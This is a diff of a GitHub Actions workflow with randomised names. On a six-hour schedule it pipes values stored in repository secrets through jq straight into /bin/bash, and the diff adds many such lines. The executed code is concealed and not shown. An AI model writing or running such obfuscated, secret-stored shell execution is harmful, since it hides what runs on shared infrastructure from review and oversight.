@@ -1,9 +1,8 @@
 name: mengtancheng9845
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 3/6 * * *'
+    - cron: '48 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +10,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: mengtancheng9845
         env:
-          gupvz463: ${{ secrets.gupvz463 }}
+          it6511: ${{ secrets.it6511 }}
         run: |
-          echo $gupvz463 | jq -r .e88115 | /bin/bash
-          echo $lp88537 | jq -r .dff061 | /bin/bash
-          echo $tx8489 | jq -r .klfa9784 | /bin/bash
-          echo $vok32 | jq -r .zmtr6 | /bin/bash
-          echo $r12 | jq -r .eoe46 | /bin/bash
-          echo $od89 | jq -r .gaxzs118 | /bin/bash
+          echo $it6511 | jq -r .tzcbn13 | /bin/bash
+          echo $fc5470 | jq -r .alhr73292 | /bin/bash
+          echo $zljq24838 | jq -r .bpben3480 | /bin/bash
+          echo $w545 | jq -r .xqh988 | /bin/bash
+          echo $bng04 | jq -r .uixku6 | /bin/bash
+          echo $mqkvv71347 | jq -r .qam912 | /bin/bash
+          echo $iyv433 | jq -r .p3689 | /bin/bash
+          echo $drzja72507 | jq -r .koaz04084 | /bin/bash
+          echo $q08 | jq -r .tirv6795 | /bin/bash
+          echo $gbzr57 | jq -r .un663 | /bin/bash
+          echo $xu3602 | jq -r .wr5822 | /bin/bash
+          echo $gtq96472 | jq -r .np44 | /bin/bash
+          echo $ffe38530 | jq -r .oawv0 | /bin/bash
+          echo $gfwo573 | jq -r .zabut39888 | /bin/bash
+          echo $tcs1604 | jq -r .ls5173 | /bin/bash
+          echo $tgwa7 | jq -r .yjqcv9638 | /bin/bash
 
